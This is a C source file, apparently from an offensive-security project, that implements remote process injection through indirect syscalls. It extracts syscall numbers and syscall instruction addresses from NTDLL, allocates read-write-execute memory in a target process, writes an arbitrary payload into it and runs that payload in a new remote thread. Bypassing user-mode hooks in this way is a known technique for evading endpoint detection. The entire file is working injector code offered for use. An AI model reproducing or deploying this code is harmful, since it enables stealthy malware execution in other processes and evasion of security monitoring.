#include "injection.h"

//---------------------------------------------------------------------------------

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD ErrorStatus
        ) {

    if (NULL == FunctionName || 0 == ErrorStatus) {
        WARN("either you didn't supply a function name"
                "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorStatus);
    return;

}

//---------------------------------------------------------------------------------

VOID IndirectPrelude(
        _In_ HMODULE NTDLLHandle,
        _In_ LPCSTR NtFunctionName,
        _Out_ PDWORD NtFunctionSSN,
        _Out_ PUINT_PTR NtFunctionSyscallAddress
        ) {

    UCHAR     SyscallOpcodes[2]        = { 0x0F, 0x05 };
    DWORD     SyscallNumber            = 0;
    UINT_PTR  NtFunctionAddress        = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NTDLLHandle, NtFunctionName);
    if (NULL == (PVOID)NtFunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return;
    }

	/*						 .----------------------------.
		NtFunction+0x0:    4C 8B D1              |      mov r10, rcx          |
		NtFunction+0x3:    B8 ?? 00 00 00 >------'      mov eax, [??] <-------'
		[...]              [...]                        [...]     |
		NtFunction+0x12:   0F 05 >--------------------> [syscall] |------.
		NtFunction+0x14:   C3                           ret       |      |
                                              .---------------------------'      |
					      |                                  |
					      '---------------> SSN              |
								Syscall <--------'
	*/

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    *NtFunctionSyscallAddress = NtFunctionAddress + 0x12;

    if (memcmp(SyscallOpcodes, *NtFunctionSyscallAddress, sizeof(SyscallOpcodes)) == 0) {
        OKAY("[0x%p] [0x%p] [0x%0.3lx] got the SSN and syscall instruction for %s!",
                (PVOID)NtFunctionAddress,
                (PVOID)*NtFunctionSyscallAddress,
                *NtFunctionSSN,
                NtFunctionName
            );
        return;
    }

    else {
        WARN("expected syscall signature: 0x0f, 0x05 didn't match.");
        return;

    }
}

//---------------------------------------------------------------------------------

BOOL IndirectSyscallsInjection(
        _In_ DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ SIZE_T PayloadSize
        ) {

    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    HMODULE  NTDLLHandle   = NULL;
    PVOID    RemoteBuffer  = NULL;
    SIZE_T   BytesWritten  = 0;
    NTSTATUS STATUS        = 0;
    BOOL     STATE         = TRUE; 

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID        = { (HANDLE)PID, NULL };

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("payload's not set. exiting...");
        return FALSE;
    }

    INFO("initializing globals...");
    NTDLLHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NTDLLHandle) {
        PrettyFormat("GetModuleHandleW", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got the address of NTDLL", NTDLLHandle);

    IndirectPrelude(
            NTDLLHandle, 
            "NtOpenProcess", 
            &g_NtOpenProcessSSN, 
            &g_NtOpenProcessSyscall
            );
    IndirectPrelude(
            NTDLLHandle,
            "NtAllocateVirtualMemory",
            &g_NtAllocateVirtualMemorySSN,
            &g_NtAllocateVirtualMemorySyscall
            );
    IndirectPrelude(
            NTDLLHandle,
            "NtWriteVirtualMemory",
            &g_NtWriteVirtualMemorySSN,
            &g_NtWriteVirtualMemorySyscall
            );
    IndirectPrelude(
            NTDLLHandle,
            "NtCreateThreadEx",
            &g_NtCreateThreadExSSN,
            &g_NtCreateThreadExSyscall
            );
    IndirectPrelude(
            NTDLLHandle,
            "NtWaitForSingleObject",
            &g_NtWaitForSingleObjectSSN,
            &g_NtWaitForSingleObjectSyscall
            );
    IndirectPrelude(
            NTDLLHandle,
            "NtClose",
            &g_NtCloseSSN,
            &g_NtCloseSyscall
            );

    INFO("attempting to get a handle on the process (%ld)...", PID);
    STATUS = fn_NtOpenProcess(
            &ProcessHandle,
            PROCESS_ALL_ACCESS,
            &OA,
            &CID
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtOpenProcess", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)", ProcessHandle, PID);

    STATUS = fn_NtAllocateVirtualMemory(
            ProcessHandle,
            &RemoteBuffer,
            0,
            &PayloadSize,
            (MEM_COMMIT | MEM_RESERVE),
            PAGE_EXECUTE_READWRITE
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtAllocateVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] [RWX] allocated a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions!",
            RemoteBuffer, PayloadSize);

    STATUS = fn_NtWriteVirtualMemory(
            ProcessHandle,
            RemoteBuffer,
            Payload,
            PayloadSize,
            &BytesWritten
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtWriteVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    for (SIZE_T i = 0; i <= PayloadSize; i++) {
        printf("\r[*] [0x%p] [RWX] [%zu/%zu] writing payload to buffer...",
                RemoteBuffer, i, PayloadSize);
    }
    (VOID)puts("");

    STATUS = fn_NtCreateThreadEx(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            &OA,
            ProcessHandle,
            RemoteBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtCreateThreadEx", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] successfully created a thread! waiting for it to finish execution...", ThreadHandle);

    STATUS = fn_NtWaitForSingleObject(
            ThreadHandle,
            FALSE,
            NULL
            );
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEAN_UP:

    /* you should look into using NtFreeVirtualMemory
       for cleanup as well for our allocated buffer. */

    if (ThreadHandle) {
        fn_NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        fn_NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return STATE;

}

//---------------------------------------------------------------------------------
